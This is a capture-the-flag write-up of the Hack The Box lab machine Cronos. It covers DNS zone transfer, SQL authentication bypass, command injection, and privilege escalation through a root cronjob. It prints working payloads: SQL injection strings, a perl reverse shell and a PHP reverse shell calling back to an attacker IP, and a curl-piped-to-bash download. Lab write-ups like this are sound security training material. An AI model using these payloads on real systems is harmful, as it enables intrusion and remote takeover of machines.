# Cronos
> Name: Cronos<br/>
> Difficulty: Medium<br/>
> Solved: 25th June 2021<br/>

## Intro
Cronos is a Linux (ubuntu) machine which i found interesting to solve. Below i'll log how i approached it and what more could be done.

## Enumeration
Lets first scan the box with nmap to see services running. I used below command:<br/>

    `$ nmap -sC -sV -oA nmap/cronos 10.10.10.13`<br/>
    
Above command runs nmap with default scripts (`-sC`), version detection (`-sV`) and creates output in various file formats.
<br/>

The scan gives the following output:
![](./images/cronos_nmap)

We have services running on port 22, 53 and 80. We'll check them in detail.

First, lets check out website running on port 80, it just gives us default Apache page. I tried gobuster on it but found no directories.
![](./images/cronos_apacheDefault.png)

Then i turned my attention to port 53, I had no idea about ISC BIND service running. Searching the internet provided good idea about it.
Below is a simple description:
> BIND (Berkeley Internet Name Domain) is an open source software that enables you to publish your Domain Name System (DNS) information on the Internet, and to resolve DNS
queries for your users.

Now i looked at `searchsploit` for known exploits, spent some time with the exploits that came up, but they also didn't work.

After a while i queried the server for its reverse DNS record, i used command `dig @10.10.10.13 -x 10.10.10.13`
Below we can see, it worked:
![](./images/cronos_dig1.png)

I have new domains. So i added ns1.cronos.htb and cronos.htb to my host file.
Visiting cronos.htb and ns1.cronos.htb provided with a simple webpage created using Laravel and no further directories were revealed with gobuster .
So this seemed like a dead end.

Now, since this is a DNS Server, it tried zone transfer and it worked. See below:
![](./images/cronos_dig.png)
Also, it revealed admin portal. admin.cronos.htb

Now i visited admin.cronos.htb and was greeted with a login form as shown below
![](./images/cronos_adminpanel.png)

I tried with few basic payloads and got in with simple SQL authentication bypass payload:<br/>
    `admin' or '1'='1'#`  or  `admin' #`  worked.
    
Below is the request in Burp 
![](./images/cronos_authbypass.png)

After the bypass it redirected me to a simple webpage, where two commands  `traceroute` and `ping` could be run. 

I verified if i could ping my machine and it did, below we can see used tcpdump to capture ping request coming to my machine.
![](./images/cronos_cmdexecution.png)

Next, it was only natural to try to see if i could get command execution here.
So i tried the payload `8.8.8.8; ls` and it displayed the contents of web root directory. Great! We have command execution.

Next i set up a listener on my local machine and ran a reverse shell on the server and got the session.<br/>
Payload using perl reverse shell
```perl
8.8.8.8; perl -e 'use Socket;$i="10.10.14.7";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
![](./images/cronos_perlshell.png)

Below i got the session :)
![](./images/cronos_rshell1.png)

Now, we have session on the server. we see a home directory of user `noulis` and there we get our `user.txt` flag.

Next task: Priveldge escalation.

## Priveledge Escalaiton

Make a local python server and upload the `linEnum.sh` script.

Start a local python server  : `$ python -m SimpleHTTPServer 8181`
Download and run on attacker :  `$ curl http://10.10.14.7/linEnum.sh | bash`
![](./images/cronos_linEnum1.png)

Spent some times time looking at the output, its a lot. Then came across something interesting:
![](./images/cronos_linEnum1.png)
Above we can see, the PHP script `/var/www/laravel/artisan` is being run as root, which we can modify.

Now, we prepare a PHP webshell and upload it to replace the contents of the  script `artisan`. 
```php
#!/usr/bin/env php
<?php
$sock=fsockopen("10.10.14.7",4445);exec("/bin/sh -i <&3 >&3 2>&3");
```

Uploading the PHP webshell
![](./images/cronos_exploitation.png)

Meanwhile, it set up a listener at port `4445`, and waited for shell to execute via cronjob.
After a minute, go the session :)
![](./images/cronos_root.png)

Now, Cronos is Owned. 



